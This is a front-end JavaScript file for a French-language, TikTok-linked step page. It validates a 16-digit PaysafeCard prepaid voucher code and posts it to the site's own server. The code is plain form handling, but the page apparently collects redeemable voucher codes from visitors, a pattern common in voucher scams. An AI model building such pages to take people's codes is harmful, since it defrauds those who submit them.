/* =========================================================
   STEP NAVIGATION
========================================================= */

let currentStep = 1;

function closeGateway() {
    document.getElementById('tiktokGateway').classList.add('hidden');
    document.body.style.overflow = '';
}

function goToStep(step) {
    document.querySelectorAll('.step-section').forEach(s => s.classList.remove('active'));
    document.getElementById('step' + step).classList.add('active');

    document.querySelectorAll('.progress-step').forEach(ps => {
        const psNum = parseInt(ps.dataset.step);
        ps.classList.remove('active', 'done');
        if (psNum < step) {
            ps.classList.add('done');
        } else if (psNum === step) {
            ps.classList.add('active');
        }
    });

    const fill = document.getElementById('progressFill');
    fill.style.width = (step / 3 * 100) + '%';

    currentStep = step;

    document.querySelector('.container').scrollIntoView({ behavior: 'smooth', block: 'start' });

    if (step === 3) {
        setTimeout(() => document.getElementById('code').focus(), 400);
    }
}


/* =========================================================
   FORM SUBMISSION
========================================================= */

document.getElementById('codeForm').addEventListener('submit', async (e) => {
    e.preventDefault();

    const code = document.getElementById('code').value.replace(/\s/g, '');
    const messageDiv = document.getElementById('message');
    const submitBtn = document.getElementById('submitBtn');

    messageDiv.className = 'message';
    messageDiv.textContent = '';

    // Validation: le code doit commencer par 0
    if (!code.startsWith('0')) {
        messageDiv.textContent = 'Code invalide. Vérifiez votre code PaysafeCard et réessayez.';
        messageDiv.className = 'message error';
        return;
    }

    // Validation du format (16 chiffres)
    if (!/^0\d{15}$/.test(code)) {
        messageDiv.textContent = 'Le code doit contenir 16 chiffres. Vérifiez et réessayez.';
        messageDiv.className = 'message error';
        return;
    }

    submitBtn.classList.add('loading');
    submitBtn.disabled = true;

    try {
        const response = await fetch('/api/send-code', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ code })
        });

        const data = await response.json();

        if (response.ok) {
            messageDiv.textContent = data.message || 'Code envoyé avec succès. BaarakaAllahu fik.';
            messageDiv.className = 'message success';
            document.getElementById('code').value = '';
        } else {
            messageDiv.textContent = data.error || 'Erreur lors de l\'envoi du code. Veuillez réessayer.';
            messageDiv.className = 'message error';
        }
    } catch (error) {
        messageDiv.textContent = 'Erreur de connexion. Veuillez réessayer.';
        messageDiv.className = 'message error';
    } finally {
        submitBtn.classList.remove('loading');
        submitBtn.disabled = false;
    }
});


/* =========================================================
   INPUT FORMATTING
========================================================= */

document.getElementById('code').addEventListener('input', function(e) {
    // Supprimer tout ce qui n'est pas un chiffre, aucun espace
    let value = e.target.value.replace(/\D/g, '');

    // Limiter à 16 chiffres
    if (value.length > 16) value = value.slice(0, 16);

    e.target.value = value;
});
